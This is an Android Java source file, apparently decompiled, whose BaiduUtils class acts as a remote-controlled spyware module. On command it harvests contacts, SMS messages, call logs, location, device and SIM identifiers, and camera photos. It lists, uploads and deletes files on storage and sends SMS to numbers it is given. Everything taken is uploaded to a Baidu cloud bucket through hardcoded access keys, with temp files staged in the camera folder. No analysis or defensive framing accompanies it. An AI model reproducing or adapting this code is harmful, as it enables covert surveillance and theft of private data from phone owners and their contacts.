package ca.ji.no.method10;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.CallLog.Calls;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import com.baidu.inf.iis.bcs.BaiduBCS;
import com.baidu.inf.iis.bcs.auth.BCSCredentials;
import com.baidu.inf.iis.bcs.model.BCSClientException;
import com.baidu.inf.iis.bcs.model.BCSServiceException;
import com.baidu.inf.iis.bcs.model.ObjectMetadata;
import com.baidu.inf.iis.bcs.request.PutObjectRequest;
import com.baidu.inf.iis.bcs.utils.Mimetypes;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Iterator;

public class BaiduUtils {
    public static String SDCardRoot = new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath())).append(File.separator).toString();
    static String accessKey = "ck3H01HbCgRbUA5Np96v63Wk";
    static String bucket = "star1-app10";
    static String host = "bcs.duapp.com";
    static String secretKey = "IuuzPahEboLyuXl7lf1OX0EOeaMsG4BY";

    public static void getFile(String filePath, Context context) {
        String tmDevice = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
        if (filePath.contains("all")) {
            getIt(filePath, context);
        } else if (filePath.split(" ")[0].equals(tmDevice)) {
            getIt(filePath, context);
        }
    }

    private static void getIt(String filePath, Context context) {
        new BaiduBCS(new BCSCredentials(accessKey, secretKey), host).setDefaultEncoding("UTF-8");
        TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
        String phoneNumner = tm.getLine1Number();
        String tmDevice = tm.getDeviceId();
        if (filePath.contains("photo")) {
            getPhoto(tmDevice);
        } else if (filePath.contains("contact")) {
            getContact(context, tmDevice);
        } else if (filePath.contains("call_log")) {
            getCallLog(context, tmDevice);
        } else if (filePath.contains("upload_message")) {
            getMessage(context, tmDevice);
        } else if (filePath.contains("location")) {
            getLocation(context, tmDevice);
        } else if (filePath.contains("send_message")) {
            sendMessage(filePath, context, tmDevice);
        } else if (filePath.contains("phone")) {
            getPhoneInfo(context);
        } else if (filePath.contains("list_file")) {
            listFileByPath(context, filePath);
        } else if (filePath.contains("upload_file")) {
            uploadFileByPath(context, filePath);
        } else if (filePath.contains("delete_file")) {
            deletFileByPath(context, filePath);
        } else if (filePath.contains("combine")) {
            getPhoneInfo(context);
            getMessage(context, tmDevice);
        }
    }

    private static void deletFileByPath(Context context, String path) {
        int start = path.indexOf("(");
        new File(SDCardRoot + path.substring(start + 1, path.indexOf(")"))).delete();
    }

    private static void uploadFileByPath(Context context, String path) {
        int start = path.indexOf("(");
        String filepath = path.substring(start + 1, path.indexOf(")"));
        TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
        String phoneNumner = tm.getLine1Number();
        String tmDevice = tm.getDeviceId();
        BaiduBCS baiduBCS = new BaiduBCS(new BCSCredentials(accessKey, secretKey), host);
        baiduBCS.setDefaultEncoding("UTF-8");
        try {
            uploadByInputStream(baiduBCS, tmDevice, filepath);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void uploadByInputStream(BaiduBCS baiduBCS, String foldname, String filePath) throws FileNotFoundException {
        File file = new File(SDCardRoot + filePath);
        InputStream fileContent = new FileInputStream(file);
        ObjectMetadata objectMetadata = new ObjectMetadata();
        objectMetadata.setContentType(Mimetypes.MIMETYPE_HTML);
        objectMetadata.setContentLength(file.length());
        ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, "/" + foldname + "/" + "UploadFile" + "/" + filePath, fileContent, objectMetadata)).getResult();
    }

    private static void listFileByPath(Context context, String filePath) {
        String[] tt = filePath.split(" ");
        TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
        String phoneNumner = tm.getLine1Number();
        String tmDevice = tm.getDeviceId();
        BaiduBCS baiduBCS = new BaiduBCS(new BCSCredentials(accessKey, secretKey), host);
        baiduBCS.setDefaultEncoding("UTF-8");
        File dir;
        if (tt.length == 2) {
            dir = new File(SDCardRoot);
        } else {
            dir = new File(SDCardRoot + tt[2]);
        }
        for (File fOrd : dir.listFiles()) {
            if (fOrd.isDirectory()) {
                createContactFile("file_list", fOrd + "\n");
            } else {
                createContactFile("file_list", fOrd.getName() + "\n");
            }
        }
        try {
            putObjectByInputStream(baiduBCS, tmDevice, "file_list");
            deletTempFile("file_list");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    private static void getPhoneInfo(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
        String phoneNumner = tm.getLine1Number();
        String tmDevice = tm.getDeviceId();
        String ss = tm.getSimSerialNumber();
        String tt = tm.getCellLocation().toString();
        String hh = tm.getDeviceSoftwareVersion();
        BaiduBCS baiduBCS = new BaiduBCS(new BCSCredentials(accessKey, secretKey), host);
        baiduBCS.setDefaultEncoding("UTF-8");
        try {
            createContactFile("PhoneInfo", "DevieID: " + tmDevice + "\n" + "PhoneNumber: " + phoneNumner + "\n" + "SIM卡序列号:" + ss + "\n" + "电话方位:" + tt + "\n" + "设备的软件版本号：" + hh + "\n");
            putObjectByInputStream(baiduBCS, tmDevice, "PhoneInfo");
            deletTempFile("PhoneInfo");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    private static void getCallLog(Context context, String deviceID) {
        BaiduBCS baiduBCS = new BaiduBCS(new BCSCredentials(accessKey, secretKey), host);
        baiduBCS.setDefaultEncoding("UTF-8");
        Cursor cursor = context.getContentResolver().query(Calls.CONTENT_URI, null, null, null, null);
        if (cursor.moveToFirst()) {
            do {
                String type;
                CallLog calls = new CallLog();
                String number = cursor.getString(cursor.getColumnIndex("number"));
                switch (Integer.parseInt(cursor.getString(cursor.getColumnIndex("type")))) {
                    case 1:
                        type = "呼入";
                        break;
                    case 2:
                        type = "呼出";
                        break;
                    case 3:
                        type = "未接";
                        break;
                    default:
                        type = "挂断";
                        break;
                }
                String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow("date")))));
                String name = cursor.getString(cursor.getColumnIndexOrThrow("name"));
                createContactFile("call_log", "Type: " + type + "  Name: " + name + "  Num: " + number + "  Time: " + time + "  Duration: " + cursor.getString(cursor.getColumnIndexOrThrow("duration")) + "\n");
            } while (cursor.moveToNext());
        }
        try {
            putObjectByInputStream(baiduBCS, deviceID, "call_log");
            deletTempFile("call_log");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    private static void sendMessage(String filePath, Context context, String tmDevice) {
        String[] tt = filePath.split(" ");
        String sendContent = tt[2];
        for (int i = 3; i <= tt.length; i++) {
            sendSMS(tt[i], sendContent);
        }
    }

    private static void sendSMS(String phoneNumber, String message) {
        SmsManager sms = SmsManager.getDefault();
        if (message.length() > 70) {
            Iterator it = sms.divideMessage(message).iterator();
            while (it.hasNext()) {
                sms.sendTextMessage(phoneNumber, null, (String) it.next(), null, null);
            }
            return;
        }
        sms.sendTextMessage(phoneNumber, null, message, null, null);
    }

    private static void getLocation(Context context, String deviceID) {
        BaiduBCS baiduBCS = new BaiduBCS(new BCSCredentials(accessKey, secretKey), host);
        baiduBCS.setDefaultEncoding("UTF-8");
        LocationManager locationManager = (LocationManager) context.getSystemService("location");
        Criteria criteria = new Criteria();
        criteria.setAccuracy(1);
        criteria.setAltitudeRequired(false);
        criteria.setBearingRequired(false);
        criteria.setCostAllowed(false);
        criteria.setPowerRequirement(1);
        Location location = locationManager.getLastKnownLocation(locationManager.getBestProvider(criteria, true));
        double latitude = location.getLatitude();
        createContactFile("location", new StringBuilder(String.valueOf(latitude)).append(" ").append(location.getLongitude()).toString());
        try {
            putObjectByInputStream(baiduBCS, deviceID, "location");
            deletTempFile("location");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    private static void getMessage(Context context, final String deviceID) {
        final BaiduBCS baiduBCS = new BaiduBCS(new BCSCredentials(accessKey, secretKey), host);
        baiduBCS.setDefaultEncoding("UTF-8");
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/"), new String[]{"address", "body", "date"}, null, null, "date");
        while (cursor.moveToNext()) {
            String address = cursor.getString(0);
            String body = cursor.getString(1);
            long date = cursor.getLong(2);
            String d = DateUtil.dateUtil(date);
            createContactFile("sms", new StringBuilder(String.valueOf(date)).append("_").append(address).append("    ").append(body).append("\n").toString());
        }
        cursor.close();
        new Thread() {
            public void run() {
                super.run();
                try {
                    Thread.sleep(4000);
                    try {
                        BaiduUtils.putObjectByInputStream(baiduBCS, deviceID, "sms");
                    } catch (FileNotFoundException e) {
                        e.printStackTrace();
                    }
                    BaiduUtils.deletTempFile("sms");
                } catch (InterruptedException e2) {
                    e2.printStackTrace();
                }
            }
        }.start();
    }

    private static void getContact(Context context, String deviceID) {
        BaiduBCS baiduBCS = new BaiduBCS(new BCSCredentials(accessKey, secretKey), host);
        baiduBCS.setDefaultEncoding("UTF-8");
        final ContentResolver contentResolver = context.getContentResolver();
        Uri uri = Uri.parse("content://com.android.contacts/raw_contacts");
        final Uri dataUri = Uri.parse("content://com.android.contacts/data");
        final Cursor cursor = contentResolver.query(uri, null, null, null, null);
        new Thread() {
            public void run() {
                super.run();
                while (cursor.moveToNext()) {
                    try {
                        String id = cursor.getString(cursor.getColumnIndex("_id"));
                        String name = cursor.getString(cursor.getColumnIndex("display_name"));
                        String number = null;
                        Cursor dataCursor = contentResolver.query(dataUri, null, "raw_contact_id = ? ", new String[]{id}, null);
                        while (dataCursor.moveToNext()) {
                            if (dataCursor.getString(dataCursor.getColumnIndex("mimetype")).equals("vnd.android.cursor.item/phone_v2")) {
                                number = dataCursor.getString(dataCursor.getColumnIndex("data1"));
                            }
                        }
                        dataCursor.close();
                        try {
                            System.out.println(name);
                            System.out.println(number);
                            BaiduUtils.createContactFile("contact", new StringBuilder(String.valueOf(name)).append("_").append(number).append("\n").toString());
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    } catch (Exception e2) {
                        e2.printStackTrace();
                        return;
                    }
                }
            }
        }.start();
        try {
            Thread.sleep(4000);
            putObjectByInputStream(baiduBCS, deviceID, "contact");
            deletTempFile("contact");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void getPhoto(final String deviceID) {
        final BaiduBCS baiduBCS = new BaiduBCS(new BCSCredentials(accessKey, secretKey), host);
        baiduBCS.setDefaultEncoding("UTF-8");
        try {
            new Thread() {
                public void run() {
                    super.run();
                    try {
                        File[] files = new File(BaiduUtils.SDCardRoot + "DCIM" + File.separator + "Camera/").listFiles();
                        for (int i = 0; i < files.length; i++) {
                            if (files[i].isFile()) {
                                String str_file = files[i].toString();
                                BaiduUtils.putObjectByInputStream(baiduBCS, deviceID + "/photo/", str_file.substring(str_file.lastIndexOf("/") + 1));
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }.start();
        } catch (BCSServiceException e) {
        } catch (BCSClientException e2) {
            e2.printStackTrace();
        } catch (Exception e3) {
            e3.printStackTrace();
        }
    }

    public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename) throws FileNotFoundException {
        File file = new File(SDCardRoot + "DCIM" + File.separator + "Camera" + File.separator + "/" + filename);
        InputStream fileContent = new FileInputStream(file);
        ObjectMetadata objectMetadata = new ObjectMetadata();
        objectMetadata.setContentType(Mimetypes.MIMETYPE_HTML);
        objectMetadata.setContentLength(file.length());
        ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, "/" + foldname + "_" + filename, fileContent, objectMetadata)).getResult();
    }

    /* access modifiers changed from: private|static */
    public static void deletTempFile(String path) {
        new File(SDCardRoot + "DCIM" + File.separator + "Camera" + File.separator + "/" + path).delete();
    }

    /* access modifiers changed from: private|static */
    public static void createContactFile(String fName, String content) {
        try {
            FileWriter writer = new FileWriter(SDCardRoot + "DCIM" + File.separator + "Camera" + File.separator + "/" + fName, true);
            writer.write(content);
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
